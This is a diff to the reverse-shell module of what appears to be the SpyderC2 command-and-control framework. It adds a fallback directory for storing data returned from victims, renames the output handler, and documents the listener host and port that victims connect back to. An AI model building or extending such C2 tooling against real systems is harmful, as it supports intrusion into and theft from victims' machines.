@@ -15,7 +15,7 @@ class Reverseshell(Module):
 	@classmethod
 	def module_options(cls):
 		h = {
-			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>', 'required' : False},
+			'path' : {'desc' : 'Directory on the attacker machine where the files are downloaded. Default is shared/victim_data/<victim_id>. NOTE : The default path can be accessed in both docker and host, accessibility of custom path will depend on where you run the program.', 'required' : False},
 			'lhost' : {'desc':'The IP address of the listening host. This is where the victim will try to connect, mostly the server IP.','required': True},
 			'lport' : {'desc':'The port of the listening host. This is where the victim will try to connect, mostly the server port.','required': True}
 		}
@@ -27,7 +27,7 @@ class Reverseshell(Module):
 		super(Reverseshell, self).__init__(name,self.description,utility,language,getattr(self,f"script_{language}")(options))    
 
 	## This class is called when victim returns the output for the task of this module. What is to be done with the output is defined here
-	def handle_task_outputs(self,data,options,victim_id, task_id):
+	def handle_task_output(self,data,options,victim_id, task_id):
 		## Comes as a bytes object, so changing to string
 		output = data.decode('utf-8')
 
@@ -46,6 +46,14 @@ class Reverseshell(Module):
 			else:
 				filepath = os.path.join(options['path'],filename)
 
+
+		## Check if we have write perms else save to /tmp/SpyderC2
+		if not os.access(os.path.dirname(filepath), os.W_OK):
+			dump_path = os.path.join('/tmp','SpyderC2',victim_id)
+			print(f"No write access to {os.path.dirname(filepath)}. Saving to {dump_path}")
+			if not os.path.exists(dump_path):
+				os.makedirs(dump_path,exist_ok=True)
+			filepath = os.path.join(dump_path,filename)
 
 		f = open(filepath,'w+')
 		print(output,file=f)
